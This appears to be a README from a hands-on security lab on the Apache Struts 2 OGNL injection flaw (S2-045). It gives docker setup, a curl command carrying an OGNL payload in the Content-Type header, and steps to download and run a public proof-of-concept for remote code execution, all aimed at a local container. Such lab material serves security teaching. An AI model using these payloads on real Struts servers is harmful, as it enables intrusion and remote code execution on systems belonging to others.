# 5. Apache Struts 2 OGNL Injection
## Subtitle / what it does
Apache Struts allows for injecting malicious Content-Type header which is later evaluated as OGNL Expression Language code. \
If an attacker is able to change security measures by executing appropriate OGNL code first, then there is possibility of regular Code Execution. \
If this vulnerability seem complex, please refer to "Recommended reading" section for useful lectures.

### Clear any existing containers
```
docker kill $(docker ps -q)
```

### Run in docker:
```
cd 5-apache-struts-2
docker-compose up -d
```

### Exploit:
```
curl -XPOST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('PWND',73*38)}.multipart/form-data" -v http://localhost:8080

```
### Proxy curl via Burp:
```
curl -XPOST --proxy http://127.0.0.1:8080 -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('PWND',73*38)}.multipart/form-data" -v http://localhost:8080

```

![image](https://user-images.githubusercontent.com/31791455/140393499-ab5e5463-ea74-46c0-a746-c8457c23f773.png)


### Code execution:
The exploit requires unlocking some OGNL features before you can pass from simple code evaluation to full RCE.
Ready to use exploit can be found here: 
```
wget https://raw.githubusercontent.com/Medicean/VulApps/master/s/struts2/s2-045/poc.py
chmod +x ./poc.py
python2 poc.py "http://127.0.0.1:8080" "id"
```

![image](https://user-images.githubusercontent.com/31791455/140393300-96dba119-0002-4c2a-af5b-0a1704484a0a.png)


### Explanation
Apache Struts is a free, open-source framework for creating Java applications. It utilizes native dialect named OGNL (Object-Graph Navigation Language). It can be parsed in form of expressions, which makes related vulnerabilities similar to Server-Side Template Injections (in fact, it works in the same way as SSTIs).

### References and recommended reading
https://portswigger.net/research/server-side-template-injection \
https://mindedsecurity.com/wp-content/uploads/2020/10/ExpressionLanguageInjection.pdf \
https://www.reshiftsecurity.com/ognl-injection-primer-for-java-developers/ \
https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/ \
https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/

### Credits:
https://github.com/vulhub/vulhub/tree/4d17ab2d4df39eefad5c498c5aa60b036a05494d/struts2/s2-045
